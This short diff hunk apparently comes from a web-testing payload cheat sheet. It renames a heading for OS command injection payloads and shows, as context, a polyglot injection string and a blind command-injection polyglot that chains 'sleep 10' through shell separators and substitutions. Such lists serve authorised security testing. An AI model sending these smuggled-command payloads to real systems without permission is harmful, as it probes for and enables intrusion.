@@ -12,7 +12,7 @@
 
 `hello"%2b"%40(${{[%25<%25'**'><h1>asad2afdsd42sg</h1>`
 
-## Error based inferer for OSCMDi, Path Traversal in Unix
+## OSCMDi context aware for Linux
 
 ``$(sleep 10) || sleep 10 | sleep 10; sleep 10 && sleep 10 `sleep 10`";$(sleep 10) `sleep 10`|| sleep 10 | sleep 10; sleep 10 && sleep 10"';sleep 10 && sleep 10 || sleep 10 | sleep 10 `sleep 10`'``
 
